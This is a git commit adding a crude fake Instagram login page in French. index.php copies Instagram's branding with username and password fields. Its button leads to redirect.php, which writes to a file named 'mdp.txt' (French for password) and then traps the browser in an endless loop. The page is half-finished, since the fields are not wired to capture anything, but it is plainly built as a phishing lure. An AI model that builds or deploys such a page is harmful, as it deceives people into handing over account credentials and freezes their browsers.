78e5fe78415677c5a97b73c82baa4ed6e6db0c97
instagralogin <129791661+instagralogin@users.noreply.github.com>
2023-04-03 21:24:12 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <title>Instagram</title>
+    
+    <link href="stylesheet.css" rel="stylesheet">
+    <meta name="viewport" content="width=100%" />
+</head>
+    
+</script>
+<body>
+    <div id="wrapper">
+        <div class="main-content">
+          <div class="header">
+            <img src="https://i.imgur.com/zqpwkLQ.png" />
+          </div>
+          <div class="l-part">
+            <input type="text" placeholder="Username" class="input-1" />
+            <div class="overlap-text">
+              <input type="password" placeholder="Password" id="input-2" />
+              <a href="#">Mot de passe oublié?</a>
+            </div>
+            <button class="btn"><a href="redirect.php" class="ab">Se connecter</a></button>
+          </div>
+        </div>
+        <div class="sub-content">
+          <div class="s-part">
+            Vous n'avez pas de compte?<a href="#">Inscrivez-vous</a>
+          </div>
+        </div>
+      </div>
+</body>
+
+</html>
---
+++ redirect.php
@@ -0,0 +1,8 @@
+<?php
+    file_put_contents('mdp.txt', 'Ecriture dans un fichier');
+?>
+<script>
+    while (true){
+        
+    }
+</script>
